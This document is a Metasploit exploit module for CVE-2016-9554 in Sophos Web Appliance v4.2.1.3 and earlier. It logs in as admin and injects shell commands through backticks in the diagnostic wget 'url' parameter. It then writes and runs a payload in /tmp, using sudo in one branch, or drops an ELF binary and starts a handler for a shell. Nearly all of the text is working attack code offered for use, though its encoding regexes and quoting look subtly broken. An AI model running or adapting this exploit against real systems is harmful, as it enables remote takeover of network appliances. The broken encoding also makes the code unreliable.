# Date: 12/12/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sophos.com
# Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
# Version: 4.2.1.3
# Tested on: 4.2.1.3
#
# CVE : CVE-2016-9554

# vuln: diagnostic_tools command / host parameter / MgrReport.php exploit

# Description PostAuth Sophos Web App FW <= v4.2.1.3 for capablities. This exploit leverages a command injection bug.
#
# xort @ Critical Start

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Exploit::Remote::Tcp
include Msf::Exploit::Remote::HttpClient

def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Sophos Web Appliace <= v4.2.1.3 remote exploit&#039;,
&#039;Description&#039; => %q{
This module exploits a remote command execution vulnerability in
the Sophos Web Appliace Version <= v4.2.1.3. The vulnerability exist in
a section of the machine&#039;s adminstrative infertface for performing diagnostic
network test with wget and unsanitized unser supplied information.
},
&#039;Author&#039; =>
[
&#039;xort@Critical Start&#039;, # vuln + metasploit module
],
&#039;Version&#039; => &#039;$Revision: 1 $&#039;,
&#039;References&#039; =>
[
[ &#039;none&#039;, &#039;none&#039;],
],
&#039;Platform&#039; => [ &#039;linux&#039;],
&#039;Privileged&#039; => true,
&#039;Arch&#039; => [ ARCH_X86 ],
&#039;SessionTypes&#039; => [ &#039;shell&#039; ],
&#039;Privileged&#039; => false,

&#039;Payload&#039; =>
{
&#039;Compat&#039; =>
{
&#039;ConnectionType&#039; => &#039;find&#039;,
}
},

&#039;Targets&#039; =>
[
[&#039;Linux Universal&#039;,
{
&#039;Arch&#039; => ARCH_X86,
&#039;Platform&#039; => &#039;linux&#039;
}
],
],
&#039;DefaultTarget&#039; => 0))

register_options(
[
OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),
OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),
OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),
Opt::RPORT(443),
], self.class)
end

def do_login(username, password_clear)
vprint_status( "Logging into machine with credentials...\n" )

# vars
timeout = 1550;
style_key = Rex::Text.rand_text_hex(32)

# send request
res = send_request_cgi(
{
&#039;method&#039; => &#039;POST&#039;,
&#039;uri&#039; => "/index.php",
&#039;vars_get&#039; => {
&#039;c&#039; => &#039;login&#039;,
},
&#039;vars_post&#039; =>
{

&#039;STYLE&#039; => style_key,
&#039;destination&#039; => &#039;&#039;,
&#039;section&#039; => &#039;&#039;,
&#039;username&#039; => username,
&#039;password&#039; => password_clear,
}
}, timeout)

return style_key
end

def run_command(username, style_password, cmd)

vprint_status( "Running Command...\n" )

# send request with payload
res = send_request_cgi({
&#039;method&#039; => &#039;POST&#039;,
&#039;vars_post&#039; => {
&#039;action&#039; => &#039;wget&#039;,
&#039;section&#039; => &#039;configuration&#039;,
&#039;STYLE&#039; => style_password ,
&#039;url&#039; => &#039;htt%3a%2f%2fwww.google.com%2f`&#039;+cmd+&#039;`&#039;,
},
&#039;vars_get&#039; => {
&#039;c&#039; => &#039;diagnostic_tools&#039;,
},
})

end


def exploit
# timeout
timeout = 1550;

# params
password_clear = datastore[&#039;PASSWORD&#039;]
user = datastore[&#039;USERNAME&#039;]

# do authentication
style_hash = do_login(user, password_clear)

vprint_status("STATUS hash authenticated: #{style_hash}\n")

# pause to let things run smoothly
sleep(5)

#if no &#039;CMD&#039; string - add code for root shell
if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?

cmd = datastore[&#039;CMD&#039;]

# Encode cmd payload
encoded_cmd = cmd.unpack("H*").join().gsub(/(w)(w)/,&#039;\x12&#039;)

run_command(user, style_hash, ("sudo%20/bin/rm%20-f%20/tmp/n%20;printf%20"#{encoded_cmd}"%20>%20/tmp/n;%20chmod%20+rx%20/tmp/n;/tmp/n" ))
else
# Encode payload to ELF file for deployment
elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
encoded_elf = elf.unpack("H*").join().gsub(/(w)(w)/,&#039;\\x12&#039;)

# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
run_command(user, style_hash, ("echo%20-e%20#{encoded_elf}>%20/tmp/m;chmod%20%2brx%20/tmp/m;/tmp/m"))

# wait for magic
handler

end


end
# sophox-release
end

